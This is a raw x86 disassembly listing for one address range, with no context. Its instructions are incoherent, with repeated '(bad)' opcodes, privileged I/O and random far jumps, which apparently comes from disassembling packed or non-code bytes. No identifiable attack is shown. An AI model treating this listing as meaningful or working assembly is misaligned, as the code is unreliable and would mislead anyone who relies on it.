  4a5bf9:	cmp    DWORD PTR [ebx+0x1e],0x14e01034
  4a5c00:	ds and al,0x37
  4a5c03:	push   edx
  4a5c04:	dec    esi
  4a5c05:	add    dh,cl
  4a5c07:	xor    BYTE PTR [ebx],ah
  4a5c09:	(bad)  
  4a5c0a:	sbb    edi,DWORD PTR [esp+edx*2+0x6a10fe12]
  4a5c11:	and    BYTE PTR [eax],al
  4a5c13:	fsubr  st(1),st
  4a5c15:	add    DWORD PTR [edi+0x186b22e6],0xa188d60
  4a5c1f:	sbb    dl,BYTE PTR [edx+0x52f1c418]
  4a5c25:	xor    eax,0xc14e06e4
  4a5c2a:	sub    ebp,ebx
  4a5c2c:	ror    bh,0x61
  4a5c2f:	add    eax,ecx
  4a5c31:	dec    ebp
  4a5c32:	sub    al,0xe9
  4a5c34:	pop    ebx
  4a5c35:	or     edi,ecx
  4a5c37:	loope  0x4a5bf6
  4a5c39:	stos   BYTE PTR es:[edi],al
  4a5c3a:	jp     0x4a5c65
  4a5c3c:	mov    ah,0x1d
  4a5c3e:	cmp    eax,0x7a33cf23
  4a5c43:	sbb    al,BYTE PTR [edx]
  4a5c45:	xchg   ebp,eax
  4a5c46:	or     esp,DWORD PTR [edx+0x6b003a53]
  4a5c4c:	test   al,0xb
  4a5c4e:	fwait
  4a5c4f:	xor    BYTE PTR [ecx],0x86
  4a5c52:	adc    BYTE PTR [edi+eax*8+0x494a4844],al
  4a5c59:	push   0xfd293f38
  4a5c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5c5f:	or     eax,0xbf69ff81
  4a5c64:	push   esi
  4a5c65:	mov    dh,0xf1
  4a5c67:	push   ebx
  4a5c68:	into   
  4a5c69:	dec    esi
  4a5c6a:	add    DWORD PTR [esi],ebx
  4a5c6c:	add    bh,bh
  4a5c6e:	add    al,0xef
  4a5c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a5c71:	add    cl,BYTE PTR [ebp-0x3f77fcaa]
  4a5c77:	mov    ecx,ebx
  4a5c79:	push   edi
  4a5c7a:	shr    ecx,0xec
  4a5c7d:	and    bl,BYTE PTR [ebx+ebx*4-0x4bfad8e4]
  4a5c84:	sar    ebx,0x10
  4a5c87:	dec    ebx
  4a5c88:	stc    
  4a5c89:	pop    edx
  4a5c8a:	lea    esp,[ebx+0x910b32d]
  4a5c90:	repnz or al,BYTE PTR [eax+0x2d]
  4a5c94:	pop    ss
  4a5c95:	js     0x4a5c44
  4a5c97:	leave  
  4a5c98:	push   edi
  4a5c99:	and    BYTE PTR [ebx+0x64],dl
  4a5c9c:	cs push 0x8
  4a5c9f:	mov    al,ds:0x12341496
  4a5ca4:	inc    ecx
  4a5ca5:	mov    ecx,0x151a8011
  4a5caa:	or     eax,0x44aca523
  4a5caf:	xor    dl,dl
  4a5cb1:	imul   eax,DWORD PTR [eax],0x75
  4a5cb4:	xchg   BYTE PTR [ebx+0xf],ch
  4a5cb7:	or     BYTE PTR [esi+0x1fa8e71a],bl
  4a5cbd:	and    al,0x34
  4a5cbf:	loopne 0x4a5cc7
  4a5cc1:	inc    eax
  4a5cc2:	jge    0x4a5c9b
  4a5cc4:	mov    ds:0x45eab991,al
  4a5cc9:	push   ss
  4a5cca:	or     al,0x28
  4a5ccc:	and    edx,edx
  4a5cce:	icebp  
  4a5ccf:	push   esi
  4a5cd0:	(bad)  
  4a5cd1:	call   0x6ea030da
  4a5cd6:	inc    ecx
  4a5cd7:	sub    DWORD PTR [eax+edx*2+0x6a],0xbeef08bd
  4a5cdf:	lods   eax,DWORD PTR ds:[esi]
  4a5ce0:	fsubp  st(3),st
  4a5ce2:	push   edx
  4a5ce3:	jne    0x4a5cee
  4a5ce5:	popa   
  4a5ce6:	fisttp QWORD PTR [esi]
  4a5ce8:	pusha  
  4a5ce9:	and    edx,DWORD PTR [esp+ebx*1]
  4a5cec:	add    esi,0xe3d89b70
  4a5cf2:	sbb    BYTE PTR [edi+0x9],dl
  4a5cf5:	into   
  4a5cf6:	mov    edx,0x55843850
  4a5cfb:	add    esp,DWORD PTR ds:0xc8940232
  4a5d01:	xor    ebp,esi
  4a5d03:	enter  0x2d6c,0x14
  4a5d07:	(bad)  
  4a5d08:	cdq    
  4a5d09:	push   ebx
  4a5d0a:	js     0x4a5d88
  4a5d0c:	daa    
  4a5d0d:	jo     0x4a5d23
  4a5d0f:	in     eax,0xd
  4a5d11:	loope  0x4a5cea
  4a5d13:	lea    ecx,[esi-0x7e]
  4a5d16:	xor    dh,cl
  4a5d18:	das    
  4a5d19:	push   esp
  4a5d1a:	xor    eax,0xb7daf740
  4a5d1f:	and    BYTE PTR [ecx+0xf8cd91],0xc3
  4a5d26:	fcmovbe st,st(2)
  4a5d28:	in     al,dx
  4a5d29:	in     eax,0x65
  4a5d2b:	scas   eax,DWORD PTR es:[edi]
  4a5d2c:	push   esp
  4a5d2d:	jns    0x4a5cef
  4a5d2f:	dec    eax
  4a5d30:	daa    
  4a5d31:	pop    ebx
  4a5d32:	neg    DWORD PTR [ebx]
  4a5d34:	es mov cl,0x5e
  4a5d37:	mov    esp,0x2c555e6f
  4a5d3c:	and    al,BYTE PTR [ecx]
  4a5d3e:	inc    esi
  4a5d3f:	push   esi
  4a5d40:	or     al,0x1a
  4a5d42:	mov    ah,0x3d
  4a5d44:	or     al,0xf8
  4a5d46:	mov    esi,0x4f5709eb
  4a5d4b:	push   esi
  4a5d4c:	or     BYTE PTR [ebx],cl
  4a5d4e:	sub    dh,BYTE PTR [ebp+0x15]
  4a5d51:	imul   ebx,DWORD PTR [eax],0xffffffdc
  4a5d54:	inc    eax
  4a5d55:	push   0x56216a87
  4a5d5a:	(bad)  
  4a5d5b:	cld    
  4a5d5c:	sbb    ecx,esp
  4a5d5e:	call   0x25eb8eb4
  4a5d63:	jno    0x4a5dc6
  4a5d65:	and    BYTE PTR [ebx],dh
  4a5d67:	sbb    ebp,DWORD PTR [esi]
  4a5d69:	arpl   WORD PTR [eax],sp
  4a5d6b:	aad    0x7f
  4a5d6d:	sub    eax,0x408bd3b
  4a5d72:	mov    ?,WORD PTR [edi+edx*2]
  4a5d75:	push   0x55ae8154
  4a5d7a:	xchg   edx,eax
  4a5d7b:	pop    esi
  4a5d7c:	test   BYTE PTR [esi+eax*2],dl
  4a5d7f:	dec    edx
  4a5d80:	inc    ecx
  4a5d81:	add    BYTE PTR [eax],ch
  4a5d83:	cmp    DWORD PTR [ebx-0x416b7efb],ecx
  4a5d89:	inc    eax
  4a5d8a:	pop    edx
  4a5d8b:	and    al,0x50
  4a5d8d:	cld    
  4a5d8e:	add    al,BYTE PTR [edi+0x66]
  4a5d91:	mov    DWORD PTR [edi],ebx
  4a5d93:	mov    bl,al
  4a5d95:	fld    DWORD PTR [ebx]
  4a5d97:	or     BYTE PTR [esi+eax*1+0x16],al
  4a5d9b:	stos   DWORD PTR es:[edi],eax
  4a5d9c:	dec    ebp
  4a5d9d:	xchg   ecx,eax
  4a5d9e:	shl    DWORD PTR [esi+0x44],cl
  4a5da1:	imul   ebx,esp,0x16ae8526
  4a5da7:	je     0x4a5d91
  4a5da9:	jg     0x4a5e13
  4a5dab:	sub    BYTE PTR [ebp-0x1b9dfdb0],bh
  4a5db1:	or     bh,ch
  4a5db3:	push   esp
  4a5db4:	and    edx,esi
  4a5db6:	xchg   esi,eax
  4a5db7:	je     0x4a5de8
  4a5db9:	dec    edx
  4a5dba:	cmp    BYTE PTR [eax],0x14
  4a5dbd:	mov    BYTE PTR [ebp+0x402c11bb],al
  4a5dc3:	jmp    DWORD PTR [eax]
  4a5dc5:	fwait
  4a5dc6:	add    al,cl
  4a5dc8:	mov    edx,0x4946e82e
  4a5dcd:	push   eax
  4a5dce:	test   BYTE PTR [esi],ah
  4a5dd0:	pop    eax
  4a5dd1:	popa   
  4a5dd2:	mov    es,WORD PTR [edx]
  4a5dd4:	sti    
  4a5dd5:	ins    DWORD PTR es:[edi],dx
  4a5dd6:	add    al,0x68
  4a5dd8:	adc    edi,ecx
  4a5dda:	mov    cs,WORD PTR [ecx-0x73]
  4a5ddd:	inc    eax
  4a5dde:	jnp    0x4a5e38
  4a5de0:	push   ecx
  4a5de1:	inc    ebx
  4a5de2:	or     DWORD PTR [bp+si],ecx
  4a5de5:	xor    ebp,DWORD PTR [ecx+0x5cf8c182]
  4a5deb:	not    DWORD PTR [ecx+0x50]
  4a5dee:	je     0x4a5df9
  4a5df0:	push   edi
  4a5df1:	cli    
  4a5df2:	xor    edx,DWORD PTR [eax]
  4a5df4:	adc    edx,esi
  4a5df6:	(bad)  
  4a5df7:	push   eax
  4a5df8:	call   0x708b3311
  4a5dfd:	sub    al,BYTE PTR [ecx-0x73]
  4a5e00:	mov    cl,BYTE PTR [eax+0x0]
  4a5e03:	dec    esi
  4a5e04:	xchg   BYTE PTR [edx],al
  4a5e06:	js     0x4a5e09
  4a5e08:	jmp    0x4ad7f7ec
  4a5e0d:	pop    esp
  4a5e0e:	lea    esi,[edx+0x6c]
  4a5e11:	mov    eax,DWORD PTR [ecx-0x7b]
  4a5e14:	or     DWORD PTR [eax],edx
  4a5e16:	cmp    bl,BYTE PTR [eax]
  4a5e18:	enter  0xe626,0x40
  4a5e1c:	and    DWORD PTR [ecx],ecx
  4a5e1e:	sub    al,0x15
  4a5e20:	jmp    0x35a3:0x8d7142b
  4a5e27:	inc    DWORD PTR [edx-0x6c]
  4a5e2a:	sub    al,0x18
  4a5e2c:	lods   al,BYTE PTR ds:[esi]
  4a5e2d:	ret    
  4a5e2e:	push   ebx
  4a5e2f:	add    al,bl
  4a5e31:	lea    esi,[edx-0xe339660]
  4a5e37:	cmp    BYTE PTR [eax-0x36],al
  4a5e3a:	test   BYTE PTR [edi+0x4add0950],dl
  4a5e40:	inc    ebx
  4a5e41:	sub    BYTE PTR [esi+0x3604358c],al
  4a5e47:	ud0    esi,DWORD PTR ds:0xf225858
  4a5e4e:	mov    edi,0xb08e8dd0
  4a5e53:	ret    0x4e74
  4a5e56:	jl     0x4a5dfc
  4a5e58:	mov    DWORD PTR [ebx],esp
  4a5e5a:	xchg   ebx,eax
  4a5e5b:	xchg   BYTE PTR ds:0x78376eda,ah
  4a5e61:	test   BYTE PTR [edi],al
  4a5e63:	stos   DWORD PTR es:[edi],eax
  4a5e64:	push   edx
  4a5e65:	jmp    0x4a5eae
  4a5e67:	push   ss
  4a5e68:	add    dh,BYTE PTR [ebp+0x3c]
  4a5e6b:	jmp    0x76fe:0xea4b6868
  4a5e72:	push   es
  4a5e73:	loop   0x4a5e78
  4a5e75:	jmp    0x4a5ead
  4a5e77:	cmp    BYTE PTR [esi+0x1e6100dc],0xdc
  4a5e7e:	mov    dh,0xac
  4a5e80:	pop    ecx
  4a5e81:	cmc    
  4a5e82:	out    dx,al
  4a5e83:	xor    cl,BYTE PTR [ecx+ebx*4+0x74]
  4a5e87:	leave  
  4a5e88:	enter  0x3ba9,0xa0
  4a5e8c:	daa    
  4a5e8d:	into   
  4a5e8e:	(bad)
  4a5e91:	aas    
  4a5e92:	add    edx,DWORD PTR [edx+0x50]
  4a5e95:	js     0x4a5ef9
  4a5e97:	pop    esp
  4a5e98:	lods   al,BYTE PTR ds:[esi]
  4a5e99:	lock or BYTE PTR [esi+ebx*1+0x7236e439],bh
  4a5ea1:	sbb    al,0xb7
  4a5ea3:	pusha  
  4a5ea4:	push   eax
  4a5ea5:	cmovo  ebp,DWORD PTR [ebp+eiz*8+0x2030e4e4]
  4a5ead:	adc    BYTE PTR [esi-0x7f],dl
  4a5eb0:	sub    dh,BYTE PTR [ebp+0x3434bd0b]
  4a5eb6:	dec    esi
  4a5eb7:	sbb    BYTE PTR [edi],bl
  4a5eb9:	xor    cl,BYTE PTR [edi+eiz*1+0x19]
  4a5ebd:	mov    dl,0xef
  4a5ebf:	jp     0x4a5ec1
  4a5ec1:	ins    DWORD PTR es:[edi],dx
  4a5ec2:	push   edi
  4a5ec3:	push   0x58082710
  4a5ec8:	and    ebp,DWORD PTR [eax-0x1e57dc55]
  4a5ece:	sub    eax,0x12d04fc9
  4a5ed3:	js     0x4a5e82
  4a5ed5:	xor    eax,0x20ded701
  4a5eda:	jb     0x4a5f39
  4a5edc:	and    eax,DWORD PTR [edi]
  4a5ede:	inc    ebp
  4a5edf:	sub    BYTE PTR [eax-0x67dfe075],al
  4a5ee5:	add    dl,BYTE PTR [eax+eax*4]
  4a5ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a5ee9:	mov    ch,0x98
  4a5eeb:	lods   al,BYTE PTR ds:[esi]
  4a5eec:	xchg   BYTE PTR [edi+0x167a94b0],dh
  4a5ef2:	and    BYTE PTR [ebp+0x53f81554],ah
  4a5ef8:	sbb    BYTE PTR [eax],dh
  4a5efa:	adc    BYTE PTR [ebp+0x5e],ch
  4a5efd:	leave  
  4a5efe:	(bad)  
  4a5eff:	xor    DWORD PTR [ebp-0x53],edi
  4a5f02:	pop    ebx
  4a5f03:	shl    BYTE PTR [ebx],0x9
  4a5f06:	sbb    al,0x60
  4a5f08:	ret    
  4a5f09:	or     eax,0x2402b940
  4a5f0e:	test   BYTE PTR [ebp+0x1],cl
  4a5f11:	scas   al,BYTE PTR es:[edi]
  4a5f12:	or     cl,ch
  4a5f14:	lods   al,BYTE PTR ds:[esi]
  4a5f15:	aas    
  4a5f16:	adc    al,0xc7
  4a5f18:	xchg   esp,eax
  4a5f19:	nop
  4a5f1a:	and    DWORD PTR [edx-0x67979730],eax
  4a5f20:	pusha  
  4a5f21:	xor    cl,BYTE PTR ss:[eax]
  4a5f24:	push   ecx
  4a5f25:	clc    
  4a5f26:	es call 0x2c2285d0
  4a5f2c:	fisubr WORD PTR [ebx]
  4a5f2e:	(bad)  
  4a5f2f:	cmp    edi,DWORD PTR [esi-0x70]
  4a5f32:	and    BYTE PTR [esi],0xf6
  4a5f35:	(bad)  
  4a5f36:	sub    ebx,esp
  4a5f38:	pop    esp
  4a5f39:	sbb    ch,bl
  4a5f3b:	ins    DWORD PTR es:[edi],dx
  4a5f3c:	pop    edx
  4a5f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a5f3e:	add    DWORD PTR [eax-0x78ba1573],edi
  4a5f44:	cmp    DWORD PTR [ebp+0x20],ecx
  4a5f47:	mov    eax,0x20a7420b
  4a5f4c:	hlt    
  4a5f4d:	shl    edx,cl
  4a5f4f:	mov    dl,0xa4
  4a5f51:	xchg   edx,eax
  4a5f52:	lock mov ah,cl
  4a5f55:	ficom  WORD PTR [edx]
  4a5f57:	shl    cl,1
  4a5f59:	sahf   
  4a5f5a:	mov    eax,0x7f7e05d7
  4a5f5f:	pop    ss
  4a5f60:	mov    ebx,gs
  4a5f62:	in     al,dx
  4a5f63:	or     cl,BYTE PTR [ebp-0x74ad8eec]
  4a5f69:	iret   
  4a5f6a:	and    edx,edi
  4a5f6c:	mov    WORD PTR [edx+0x41258104],?
  4a5f72:	bound  ebx,QWORD PTR [edx]
  4a5f74:	and    BYTE PTR [edi],bh
  4a5f76:	or     dh,cl
  4a5f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a5f79:	dec    edi
  4a5f7a:	hlt    
  4a5f7b:	add    esi,edi
  4a5f7d:	jmp    0x4a5f33
  4a5f7f:	add    ebx,eax
  4a5f81:	dec    esp
  4a5f82:	ins    BYTE PTR es:[edi],dx
  4a5f83:	mov    edx,0x1854ab7c
  4a5f88:	ds jl  0x4a5f95
  4a5f8b:	cmp    dh,BYTE PTR [esi-0x50a1eb4c]
  4a5f91:	scas   eax,DWORD PTR es:[edi]
  4a5f92:	mov    ds:0xa727c0d1,al
  4a5f97:	jg     0x4a5fc4
  4a5f99:	iret   
  4a5f9a:	or     cl,BYTE PTR [ebx]
  4a5f9c:	push   es
  4a5f9d:	fld    QWORD PTR [ebx]
  4a5f9f:	icebp  
  4a5fa0:	inc    ebp
  4a5fa1:	jae    0x4a5fe5
  4a5fa3:	push   es
  4a5fa4:	pop    esi
  4a5fa5:	add    ebx,ebx
  4a5fa7:	mov    bl,BYTE PTR [edx]
  4a5fa9:	add    DWORD PTR [eax+0x7e584c43],0xa1b0444d
  4a5fb3:	or     ebp,DWORD PTR [eax]
  4a5fb5:	cmp    DWORD PTR [ebp+edi*2+0x60],ecx
  4a5fb9:	daa    
  4a5fba:	(bad)  
  4a5fbb:	loopne 0x4a5f40
  4a5fbd:	pop    esp
  4a5fbe:	movnti DWORD PTR [edx+ecx*1+0x2b],esi
  4a5fc3:	sbb    al,0x98
  4a5fc5:	cli    
  4a5fc6:	loopne 0x4a5fdd
  4a5fc8:	mov    bl,BYTE PTR [edi+edi*2]
  4a5fcb:	mov    bl,0x8b
  4a5fcd:	dec    ecx
  4a5fce:	jge    0x4a5fe3
  4a5fd0:	sbb    eax,DWORD PTR [edi+0x34]
  4a5fd3:	pop    edx
  4a5fd4:	pop    es
  4a5fd5:	das    
  4a5fd6:	sub    eax,DWORD PTR [eax]
  4a5fd8:	cli    
  4a5fd9:	inc    eax
  4a5fda:	outs   dx,BYTE PTR ds:[esi]
  4a5fdb:	mov    bl,0x43
  4a5fdd:	retf   
  4a5fde:	adc    al,0xda
  4a5fe0:	push   ss
  4a5fe1:	mov    ch,0x2b
  4a5fe3:	call   0xe88bcd60
  4a5fe8:	dec    eax
  4a5fe9:	out    0x66,al
  4a5feb:	and    eax,0x8d96ba58
  4a5ff0:	or     esp,DWORD PTR [esp+ecx*8]
  4a5ff3:	cmp    BYTE PTR [eax-0x7],dl
  4a5ff6:	test   DWORD PTR [eax-0x4f5d9e8e],ebp
  4a5ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a5ffd:	jle    0x4a5ffa
  4a5fff:	cmp    ch,BYTE PTR fs:[ebx*4-0x6ac54e33]
  4a6007:	aam    0x3
  4a6009:	cmp    BYTE PTR [edi*1+0x2f6a351b],ch
  4a6010:	pop    es
  4a6011:	dec    eax
  4a6012:	mov    bl,0x95
  4a6014:	mov    edx,0x503f7b1d
  4a6019:	test   DWORD PTR [ebp+0x2c5a66cb],esp
  4a601f:	add    al,0x2e
  4a6021:	repnz xor dl,BYTE PTR ds:0xd58d5c96
  4a6028:	mul    DWORD PTR [ecx+0x10372585]
  4a602e:	xchg   ebp,eax
  4a602f:	jnp    0x4a602c
  4a6031:	(bad)  [edi]
  4a6033:	and    al,BYTE PTR [edi]
  4a6035:	jge    0x4a5fbe
  4a6037:	adc    BYTE PTR [esp+ebx*2-0x13],dh
  4a603b:	rol    BYTE PTR [esi+0x44034b0e],0xf2
  4a6042:	push   edx
  4a6043:	or     BYTE PTR [ebx-0x72],0x5d
  4a6047:	push   ecx
  4a6048:	sub    al,0xbd
  4a604a:	xchg   esi,eax
  4a604b:	or     al,0xa3
  4a604d:	ret    
  4a604e:	or     ebx,DWORD PTR [edx]
  4a6050:	sbb    eax,0x81f9e4c
  4a6055:	add    al,0x18
  4a6057:	daa    
  4a6058:	jnp    0x4a5fe5
  4a605a:	cmp    ch,BYTE PTR fs:[ecx*1+0x20694d89]
  4a6062:	dec    edi
  4a6063:	add    ax,0x646
  4a6067:	sbb    BYTE PTR [eax+0x51],bl
  4a606a:	ins    DWORD PTR es:[edi],dx
  4a606b:	pop    eax
  4a606c:	aad    0xf8
  4a606e:	and    BYTE PTR [edi],cl
  4a6070:	add    al,0x19
  4a6072:	std    
  4a6073:	xchg   ebx,eax
  4a6074:	in     al,0x42
  4a6076:	enter  0xd4d7,0x3
  4a607a:	or     eax,0x9638a7a9
  4a607f:	xor    DWORD PTR [edx],esp
  4a6081:	jmp    0x3f53:0xa39010bf
  4a6088:	or     BYTE PTR [esi],ch
  4a608a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a608b:	sub    eax,0xeb91fa91
  4a6090:	xor    DWORD PTR [edx-0x7f],0x9f1275d0
  4a6097:	ds xor esp,esi
  4a609a:	and    BYTE PTR [eax-0x42],ah
  4a609d:	clc    
  4a609e:	daa    
  4a609f:	retf   
  4a60a0:	xor    BYTE PTR [ebp-0x42],0xde
  4a60a4:	mov    dh,0x53
  4a60a6:	lods   al,BYTE PTR ds:[esi]
  4a60a7:	or     BYTE PTR [eax],cl
  4a60a9:	sbb    eax,0x658f7203
  4a60ae:	pusha  
  4a60af:	inc    ebp
  4a60b0:	pop    esp
  4a60b1:	sbb    ah,BYTE PTR [esi]
  4a60b3:	in     al,0x66
  4a60b5:	(bad)  
  4a60b6:	sbb    cl,BYTE PTR [ecx+0x120a285a]
  4a60bc:	je     0x4a608c
  4a60be:	adc    cl,BYTE PTR [esi]
  4a60c0:	or     dl,BYTE PTR [eax]
  4a60c2:	pop    ecx
  4a60c3:	sub    ecx,DWORD PTR ds:0xc4342014
  4a60c9:	push   edi
  4a60ca:	adc    al,0x5a
  4a60cc:	ja     0x4a6117
  4a60ce:	jmp    0x4a613f
  4a60d0:	inc    ecx
  4a60d1:	pop    edx
  4a60d2:	and    esp,ebx
  4a60d4:	bound  ecx,QWORD PTR [ebx+0x38]
  4a60d7:	scas   eax,DWORD PTR es:[edi]
  4a60d8:	bound  esi,QWORD PTR [edx+0x1]
  4a60db:	shr    bh,1
  4a60dd:	lahf   
  4a60de:	lods   al,BYTE PTR ds:[esi]
  4a60df:	jmp    0x4a60ed
  4a60e1:	mov    BYTE PTR [esi-0x199ab404],bl
  4a60e7:	xchg   edx,eax
  4a60e8:	ss inc eax
  4a60ea:	out    0x7e,al
  4a60ec:	mov    edi,0x93b660d9
  4a60f1:	aaa    
  4a60f2:	cmp    DWORD PTR [ebx],ecx
  4a60f4:	jne    0x4a6101
  4a60f6:	(bad)  
  4a60f7:	mov    ebp,0x805f8dc0
  4a60fc:	movzx  ecx,BYTE PTR gs:[edi-0x9]
  4a6101:	fcomp  DWORD PTR [edi+0x1b]
  4a6104:	cdq    
  4a6105:	push   0xffffffbc
  4a6107:	sub    ecx,DWORD PTR [esi]
  4a6109:	and    eax,0xb
  4a610c:	sub    eax,0x8761891
  4a6111:	or     eax,0xff8b0818
  4a6116:	sbb    esi,DWORD PTR [edi+0x7a]
  4a6119:	fadd   st,st(4)
  4a611b:	dec    edx
  4a611c:	sahf   
  4a611d:	loopne 0x4a614d
  4a611f:	sbb    ecx,DWORD PTR [edi+0x6b]
  4a6122:	jb     0x4a60f3
  4a6124:	mov    edx,0x21fc111
  4a6129:	shl    BYTE PTR [edi-0x1d],0x69
  4a612d:	sar    bl,0xb4
  4a6130:	test   eax,0x50ee9153
  4a6135:	xchg   ebp,eax
  4a6136:	jmp    0x4a94:0x1e8ec2b
  4a613d:	jne    0x4a6128
  4a613f:	mov    dl,0xa4
  4a6141:	add    eax,0x4c468a96
  4a6146:	add    dh,BYTE PTR [eax]
  4a6148:	adc    eax,0x61618a8
  4a614d:	or     ch,BYTE PTR [ecx]
  4a614f:	sbb    eax,0x28cd19e1
  4a6154:	mov    ?,WORD PTR [edi+edx*2+0x3bea3817]
  4a615b:	xchg   ecx,eax
  4a615c:	sbb    BYTE PTR [edi+0xe2a5009],bh
  4a6162:	int3   
  4a6163:	test   DWORD PTR [edx],eax
  4a6165:	std    
  4a6166:	(bad)  
  4a6167:	fstp   st(0)
  4a6169:	dec    edi
  4a616a:	jne    0x4a6161
  4a616c:	mov    edi,0xa0000f2f
  4a6171:	push   ss
  4a6172:	icebp  
  4a6173:	fmul   QWORD PTR ds:0x5ea0b248
  4a6179:	dec    ebx
  4a617a:	(bad)  
  4a617c:	sar    DWORD PTR [ecx+edx*2+0x2b],cl
  4a6180:	add    al,0xe
  4a6182:	cmp    bl,BYTE PTR [edi+0x1e]
  4a6185:	sub    al,0x95
  4a6187:	push   cs
  4a6188:	pop    ecx
  4a6189:	bound  esp,QWORD PTR [ecx+0x1ad018b0]
  4a618f:	add    al,0xc0
  4a6191:	push   ds
  4a6192:	js     0x4a61b5
  4a6194:	cmc    
  4a6195:	fdivrp st(0),st
  4a6197:	aas    
  4a6198:	js     0x4a620f
  4a619a:	adc    eax,edi
  4a619c:	xchg   BYTE PTR [esi],cl
  4a619e:	ins    DWORD PTR es:[edi],dx
  4a619f:	and    BYTE PTR cs:[edi],ah
  4a61a2:	test   ecx,ebx
  4a61a4:	leave  
  4a61a5:	xor    bh,al
  4a61a7:	mov    eax,0x1a61804f
  4a61ac:	or     cl,BYTE PTR [ecx-0x6f4ac472]
  4a61b2:	and    esi,DWORD PTR [ecx]
  4a61b4:	sbb    ah,BYTE PTR [si]
  4a61b7:	sbb    eax,0x7c22a81d
  4a61bc:	dec    esi
  4a61bd:	call   0x4a67:0x4650484f
  4a61c4:	xchg   ebp,eax
  4a61c5:	add    al,0x5c
  4a61c7:	cmp    eax,0x386dcd27
  4a61cc:	fsub   DWORD PTR [edi]
  4a61ce:	stos   BYTE PTR es:[edi],al
  4a61cf:	push   ss
  4a61d0:	inc    eax
  4a61d1:	mov    BYTE PTR [ecx+0x37],dh
  4a61d4:	adc    esp,DWORD PTR [ecx+ecx*1-0x6a]
  4a61d8:	dec    esp
  4a61d9:	cmp    dl,bh
  4a61db:	cli    
  4a61dc:	sub    cl,ch
  4a61de:	ins    DWORD PTR es:[edi],dx
  4a61df:	int3   
  4a61e0:	sbb    BYTE PTR [esi+0x25eb1a40],cl
  4a61e6:	pop    ebp
  4a61e7:	or     BYTE PTR [ecx],bh
  4a61e9:	push   ebx
  4a61ea:	iret   
  4a61eb:	sbb    al,al
  4a61ed:	shl    eax,0x68
  4a61f0:	mov    bl,0x31
  4a61f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a61f3:	xchg   BYTE PTR cs:[ebx],ah
  4a61f6:	sbb    eax,0x74024a83
  4a61fb:	inc    edi
  4a61fc:	inc    esp
  4a61fd:	daa    
  4a61fe:	xor    al,0xb5
  4a6200:	adc    BYTE PTR [eax-0x5a],dl
  4a6203:	es push 0xded75e23
  4a6209:	mov    ds,WORD PTR [edi]
  4a620b:	mov    edi,DWORD PTR [edi]
  4a620d:	push   0x4dc15f84
  4a6212:	dec    ecx
  4a6213:	imul   esi,DWORD PTR [edx],0x135bfd9f
  4a6219:	int    0x44
  4a621b:	push   edi
  4a621c:	sar    DWORD PTR [ecx],0x7e
  4a621f:	sbb    BYTE PTR [ebp+0x5d],dh
  4a6222:	cmp    eax,DWORD PTR [esi-0x17ffaac4]
  4a6228:	lock and BYTE PTR [edi],cl
  4a622b:	add    edi,0x53
  4a622e:	stos   DWORD PTR es:[edi],eax
  4a622f:	sbb    BYTE PTR [ecx],0xdd
  4a6232:	fisttp QWORD PTR [esi+0x38968b51]
  4a6238:	or     ebx,DWORD PTR [esi+0x58]
  4a623b:	lods   eax,DWORD PTR ds:[esi]
  4a623c:	clc    
  4a623d:	pop    edi
  4a623e:	or     esp,ebx
  4a6240:	mov    cl,BYTE PTR [ecx+edx*1]
  4a6243:	mov    BYTE PTR [eax+ebx*1],cl
  4a6246:	add    DWORD PTR [eax-0xfab41ff],ebp
  4a624c:	outs   dx,BYTE PTR ds:[esi]
  4a624d:	xchg   edi,eax
  4a624e:	aas    
  4a624f:	or     edi,DWORD PTR [ebx]
  4a6251:	xchg   esi,eax
  4a6252:	xchg   DWORD PTR [edx-0x34],esi
  4a6255:	pop    ebx
  4a6256:	pop    edi
  4a6257:	sbb    al,0x40
  4a6259:	add    esp,DWORD PTR [edi+0x6b]
  4a625c:	mov    al,0x31
  4a625e:	mov    ecx,0x535c3773
  4a6263:	(bad)  
  4a6265:	aam    0x9f
  4a6267:	xchg   ebp,eax
  4a6268:	js     0x4a62ba
  4a626a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a626b:	mov    ebp,0xa0a51ecb
  4a6270:	cdq    
  4a6271:	stos   BYTE PTR es:[edi],al
  4a6272:	dec    ebx
  4a6273:	sahf   
  4a6274:	mov    gs,WORD PTR [ecx-0x7a]
  4a6277:	mov    cl,0x58
  4a6279:	popf   
  4a627a:	xor    al,0x10
  4a627c:	sub    ebx,DWORD PTR [esi+0x53]
  4a627f:	cli    
  4a6280:	push   esi
  4a6281:	push   edi
  4a6282:	mov    esi,0x6f107506
  4a6287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6288:	xor    al,0xc0
  4a628a:	pop    esi
  4a628b:	push   edi
  4a628c:	adc    bh,BYTE PTR [ebp+0x34]
  4a628f:	scas   eax,DWORD PTR es:[edi]
  4a6290:	xchg   ebx,eax
  4a6291:	and    DWORD PTR [ebp-0x15],edi
  4a6294:	jo     0x4a6275
  4a6296:	cmp    al,0x42
  4a6298:	mov    edx,0x8d813f0e
  4a629d:	jecxz  0x4a6274
  4a629f:	ds mov al,cl
  4a62a2:	and    al,0x1
  4a62a4:	outs   dx,BYTE PTR ds:[esi]
  4a62a5:	xor    cl,0x8f
  4a62a8:	xor    bl,BYTE PTR [edx-0x187e06cd]
  4a62ae:	(bad)  
  4a62af:	sub    ecx,ebp
  4a62b1:	inc    edi
  4a62b3:	dec    edx
  4a62b4:	ds and eax,0x9908b0df
  4a62ba:	shr    edi,1
  4a62bc:	xor    edi,DWORD PTR [esi+0x58580634]
  4a62c2:	icebp  
  4a62c3:	or     eax,0x4af833c3
  4a62c8:	mov    DWORD PTR [esi-0x24],edi
  4a62cb:	into   
  4a62cc:	mov    edx,0xd59aad04
  4a62d1:	les    edx,FWORD PTR [ecx+0x75]
  4a62d4:	fsubrp st(0),st
  4a62d6:	mov    ch,0xb1
  4a62d8:	mov    ds:0x330d8b75,al
  4a62dd:	mov    dl,cl
  4a62df:	and    dl,0x1e
  4a62e2:	mov    ecx,0xc266fdfc
  4a62e7:	mov    edx,DWORD PTR [esi]
  4a62e9:	imul   edx,ecx,0xffffff81
